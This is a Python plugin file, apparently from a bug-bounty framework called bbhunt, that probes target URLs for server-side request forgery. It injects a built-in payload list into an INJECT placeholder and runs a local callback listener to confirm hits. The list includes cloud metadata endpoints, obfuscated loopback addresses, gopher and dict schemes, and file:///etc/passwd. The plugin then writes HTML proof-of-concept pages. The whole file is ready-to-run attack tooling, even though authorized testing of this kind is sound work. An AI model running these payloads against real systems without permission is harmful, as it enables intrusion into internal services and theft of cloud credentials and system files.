#!/usr/bin/env python3
# plugins/exploit/ssrf_verify.py - SSRF verification plugin

import os
import re
import json
import time
import socket
import threading
import urllib.parse
import requests
import subprocess
from typing import Dict, Any, List, Optional, Tuple
from bbhunt.core.plugin import Plugin

class SSRFVerifyPlugin(Plugin):
    """SSRF vulnerability verification plugin."""
    
    __plugin_name__ = "ssrf_verify"
    __plugin_description__ = "Verify SSRF vulnerabilities"
    __plugin_version__ = "1.0.0"
    __plugin_category__ = "exploit"
    __plugin_dependencies__ = []
    __plugin_resources__ = {
        "memory": "500MB",
        "cpu": 1,
        "disk": "50MB",
        "network": True
    }
    
    def setup(self):
        """Initialize plugin."""
        # Disable SSL warnings
        try:
            requests.packages.urllib3.disable_warnings()
        except:
            pass
        
        # Initialize session
        self.session = requests.Session()
        
        # Initialize callback server
        self.callback_server = None
        self.callbacks = []
        self.callback_lock = threading.Lock()
    
    def execute(self, target: str, options: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """
        Verify SSRF vulnerabilities.
        
        Args:
            target: Target domain or URL
            options: Plugin options
            
        Returns:
            Dict with results
        """
        options = options or {}
        
        # Parse options
        url = options.get('url', '')
        input_file = options.get('input_file', '')
        user_agent = options.get('user_agent', 'bbhunt-ssrf-verify')
        callback_server = options.get('callback_server', '')
        listen_port = int(options.get('listen_port', 8000))
        custom_payloads = options.get('payloads', [])
        
        # Set user agent
        self.session.headers.update({'User-Agent': user_agent})
        
        # Process targets
        targets = []
        
        if url:
            # Single URL with INJECT placeholder
            if "INJECT" in url:
                targets.append(url)
            else:
                return {
                    "status": "error",
                    "message": "URL must contain INJECT placeholder",
                    "data": {}
                }
        elif input_file:
            # Read targets from file
            if os.path.exists(input_file):
                with open(input_file, 'r') as f:
                    targets = [line.strip() for line in f.readlines()]
                
                # Filter targets to only include those with INJECT placeholder
                targets = [t for t in targets if "INJECT" in t]
                
                if not targets:
                    return {
                        "status": "error",
                        "message": "No valid targets found in input file",
                        "data": {}
                    }
            else:
                return {
                    "status": "error",
                    "message": f"Input file not found: {input_file}",
                    "data": {}
                }
        else:
            # Try to construct a URL with common injection points
            if not target.startswith(('http://', 'https://')):
                base_url = f"https://{target}"
            else:
                base_url = target
            
            # Common injection points
            targets = [
                f"{base_url}/api/fetch?url=INJECT",
                f"{base_url}/proxy?url=INJECT",
                f"{base_url}/load?resource=INJECT"
            ]
        
        # Create output directory
        target_domain = target.replace('http://', '').replace('https://', '').split('/')[0]
        exploit_dir = os.path.join('data', 'targets', target, 'exploit', 'ssrf')
        os.makedirs(exploit_dir, exist_ok=True)
        
        # Determine callback server
        if not callback_server:
            # Try to get public IP
            public_ip = self._get_public_ip()
            
            if public_ip:
                callback_server = public_ip
            else:
                # Fallback to local IP
                callback_server = self._get_local_ip()
        
        self.logger.info(f"Using callback server: {callback_server}")
        
        # Generate SSRF payloads
        payloads = custom_payloads if custom_payloads else self._generate_ssrf_payloads(callback_server, listen_port)
        
        # Start callback listener
        self._start_callback_server(listen_port)
        
        # Initialize results
        results = {
            "status": "success",
            "message": "",
            "data": {
                "callbacks": [],
                "vulnerable_urls": []
            }
        }
        
        # Test each target with each payload
        for target_url in targets:
            self.logger.info(f"Testing SSRF on {target_url}")
            
            for payload in payloads:
                # URL encode the payload
                encoded_payload = urllib.parse.quote_plus(payload)
                
                # Replace INJECT placeholder with payload
                test_url = target_url.replace("INJECT", encoded_payload)
                
                try:
                    # Make request
                    response = self.session.get(test_url, verify=False, timeout=10, allow_redirects=True)
                    
                    # Wait a moment for callback to arrive
                    time.sleep(1)
                    
                    # Check if we got a callback
                    with self.callback_lock:
                        for callback in self.callbacks:
                            if payload in callback['request']:
                                self.logger.info(f"Got callback for payload: {payload}")
                                self.logger.info(f"URL: {test_url}")
                                
                                # Save vulnerable URL and payload
                                results["data"]["callbacks"].append(callback)
                                results["data"]["vulnerable_urls"].append({
                                    "url": test_url,
                                    "payload": payload,
                                    "callback_time": callback['time']
                                })
                                
                                # Save response for evidence
                                evidence_file = os.path.join(exploit_dir, f"ssrf_evidence_{len(results['data']['vulnerable_urls'])}.html")
                                with open(evidence_file, 'w') as f:
                                    f.write(response.text)
                                
                                # Create proof of concept
                                self._create_poc(test_url, payload, exploit_dir, len(results["data"]["vulnerable_urls"]))
                                
                                # No need to check other callbacks for this payload
                                break
                except Exception as e:
                    self.logger.error(f"Error testing payload {payload}: {str(e)}")
        
        # Stop callback server
        self._stop_callback_server()
        
        # Save results to file
        results_file = os.path.join(exploit_dir, 'ssrf_results.json')
        with open(results_file, 'w') as f:
            json.dump(results["data"], f, indent=2)
        
        # Update result message
        results["message"] = f"Found {len(results['data']['vulnerable_urls'])} SSRF vulnerabilities"
        
        return results
    
    def _generate_ssrf_payloads(self, callback_server: str, listen_port: int) -> List[str]:
        """
        Generate SSRF payloads.
        
        Args:
            callback_server: Callback server address
            listen_port: Port to listen on
            
        Returns:
            List of SSRF payloads
        """
        payloads = [
            # Basic callbacks to our server
            f"http://{callback_server}:{listen_port}/ssrf-basic",
            f"https://{callback_server}:{listen_port}/ssrf-secure",
            
            # Internal services
            "http://localhost:22/",
            "http://127.0.0.1:22/",
            "http://[::1]:22/",
            
            # IP obfuscation
            f"http://0177.0.0.1:{listen_port}/ssrf-octal",
            f"http://2130706433:{listen_port}/ssrf-decimal",
            f"http://0x7f.0.0.1:{listen_port}/ssrf-hex",
            
            # Cloud metadata services
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            
            # URL redirection to internal services
            f"http://{callback_server}:{listen_port}/redirect?url=http://169.254.169.254/latest/meta-data/",
            
            # Different protocols
            f"gopher://{callback_server}:{listen_port}/_SSRF",
            f"dict://{callback_server}:{listen_port}/ssrf:test",
            "file:///etc/passwd"
        ]
        
        return payloads
    
    def _get_public_ip(self) -> str:
        """
        Get public IP address.
        
        Returns:
            Public IP address or empty string
        """
        try:
            response = requests.get('https://api.ipify.org', timeout=5)
            return response.text.strip()
        except:
            try:
                response = requests.get('https://ifconfig.me', timeout=5)
                return response.text.strip()
            except:
                return ""
    
    def _get_local_ip(self) -> str:
        """
        Get local IP address.
        
        Returns:
            Local IP address or localhost
        """
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "localhost"
    
    def _start_callback_server(self, port: int) -> None:
        """
        Start callback server.
        
        Args:
            port: Port to listen on
        """
        self.logger.info(f"Starting callback server on port {port}")
        
        # Clear callbacks
        self.callbacks = []
        
        # Create server
        server_thread = threading.Thread(target=self._callback_server_thread, args=(port,))
        server_thread.daemon = True
        server_thread.start()
        
        self.callback_server = server_thread
    
    def _callback_server_thread(self, port: int) -> None:
        """
        Callback server thread.
        
        Args:
            port: Port to listen on
        """
        # Create socket
        try:
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server_socket.bind(('0.0.0.0', port))
            server_socket.listen(5)
            server_socket.settimeout(1.0)  # Allow for clean shutdown
            
            while True:
                try:
                    # Accept connection
                    client_socket, addr = server_socket.accept()
                    client_socket.settimeout(5.0)
                    
                    # Handle connection in a separate thread
                    threading.Thread(
                        target=self._handle_callback, 
                        args=(client_socket, addr)
                    ).start()
                except socket.timeout:
                    # Check if we should stop
                    if not hasattr(self, 'callback_server') or self.callback_server is None:
                        break
                except Exception as e:
                    self.logger.error(f"Error accepting connection: {str(e)}")
        except Exception as e:
            self.logger.error(f"Error starting callback server: {str(e)}")
        finally:
            try:
                server_socket.close()
            except:
                pass
    
    def _handle_callback(self, client_socket: socket.socket, addr: Tuple[str, int]) -> None:
        """
        Handle callback connection.
        
        Args:
            client_socket: Client socket
            addr: Client address
        """
        try:
            # Read request
            request_data = b''
            while True:
                chunk = client_socket.recv(4096)
                if not chunk:
                    break
                request_data += chunk
                if b'\r\n\r\n' in request_data:
                    break
            
            request_str = request_data.decode('utf-8', errors='ignore')
            
            # Log callback
            with self.callback_lock:
                self.callbacks.append({
                    'time': time.time(),
                    'address': f"{addr[0]}:{addr[1]}",
                    'request': request_str
                })
            
            # Send response
            response = (
                b"HTTP/1.1 200 OK\r\n"
                b"Content-Type: text/plain\r\n"
                b"Connection: close\r\n"
                b"\r\n"
                b"SSRF Callback Received"
            )
            client_socket.sendall(response)
        except Exception as e:
            self.logger.error(f"Error handling callback: {str(e)}")
        finally:
            try:
                client_socket.close()
            except:
                pass
    
    def _stop_callback_server(self) -> None:
        """Stop callback server."""
        self.logger.info("Stopping callback server")
        
        # Set server to None to signal thread to stop
        self.callback_server = None
        
        # Give it a moment to shut down
        time.sleep(2)
    
    def _create_poc(self, url: str, payload: str, output_dir: str, index: int) -> None:
        """
        Create a proof of concept for the SSRF vulnerability.
        
        Args:
            url: Vulnerable URL
            payload: SSRF payload
            output_dir: Output directory
            index: Index for the filename
        """
        # Create PoC file
        poc_file = os.path.join(output_dir, f"ssrf_poc_{index}.html")
        
        with open(poc_file, 'w') as f:
            f.write(f"""<!DOCTYPE html>
<html>
<head>
    <title>SSRF Proof of Concept</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; }}
        h1 {{ color: #d9534f; }}
        .container {{ margin-top: 20px; }}
        .alert {{ padding: 15px; background-color: #f8d7da; border: 1px solid #f5c6cb; border-radius: 4px; color: #721c24; }}
        .code {{ background: #f8f9fa; padding: 10px; border-radius: 4px; font-family: monospace; overflow-x: auto; }}
        .button {{ display: inline-block; background: #d9534f; color: white; padding: 10px 15px; text-decoration: none; border-radius: 4px; }}
    </style>
</head>
<body>
    <h1>SSRF Vulnerability Proof of Concept</h1>
    <div class="container">
        <p>This demonstrates a Server-Side Request Forgery vulnerability in the application.</p>
        
        <h2>Vulnerability Details</h2>
        <p>The application makes HTTP requests to user-supplied URLs without proper validation, allowing an attacker to access internal services or sensitive information.</p>
        
        <h2>Payload Used</h2>
        <div class="code">{payload}</div>
        
        <h2>Vulnerable URL</h2>
        <div class="code">{url}</div>
        
        <h2>Steps to Reproduce</h2>
        <ol>
            <li>Click the button below to trigger the vulnerability</li>
            <li>The server will make a request to the SSRF payload URL</li>
            <li>This could allow access to internal resources or sensitive information</li>
        </ol>
        
        <p class="alert">Warning: This is for demonstration purposes only. Do not use maliciously.</p>
        
        <p><a class="button" href="{url}" target="_blank">Trigger Vulnerability</a></p>
    </div>
</body>
</html>""")
    
    def cleanup(self):
        """Clean up resources."""
        # Make sure callback server is stopped
        self._stop_callback_server()
    
    @classmethod
    def cli_options(cls) -> List[Dict[str, Any]]:
        """Define CLI options for this plugin."""
        return [
            {
                "name": "--url",
                "help": "URL with INJECT placeholder",
                "type": str
            },
            {
                "name": "--input-file",
                "help": "File containing URLs with INJECT placeholder",
                "type": str
            },
            {
                "name": "--user-agent",
                "help": "Custom User-Agent string",
                "type": str,
                "default": "bbhunt-ssrf-verify"
            },
            {
                "name": "--callback-server",
                "help": "Callback server address",
                "type": str
            },
            {
                "name": "--listen-port",
                "help": "Port to listen on for callbacks",
                "type": int,
                "default": 8000
            },
            {
                "name": "--payloads-file",
                "help": "File containing custom payloads",
                "type": str
            }
        ]
    
    @classmethod
    def interactive_options(cls) -> List[Dict[str, Any]]:
        """Define interactive prompts for this plugin."""
        return [
            {
                "type": "input",
                "name": "url",
                "message": "URL with INJECT placeholder:",
                "default": ""
            },
            {
                "type": "input",
                "name": "input_file",
                "message": "File containing URLs with INJECT placeholder (leave empty to use URL):",
                "default": ""
            },
            {
                "type": "input",
                "name": "user_agent",
                "message": "Custom User-Agent string:",
                "default": "bbhunt-ssrf-verify"
            },
            {
                "type": "input",
                "name": "callback_server",
                "message": "Callback server address (leave empty for auto-detection):",
                "default": ""
            },
            {
                "type": "input",
                "name": "listen_port",
                "message": "Port to listen on for callbacks:",
                "default": "8000"
            },
            {
                "type": "input",
                "name": "payloads_file",
                "message": "File containing custom payloads (leave empty for default payloads):",
                "default": ""
            }
        ]
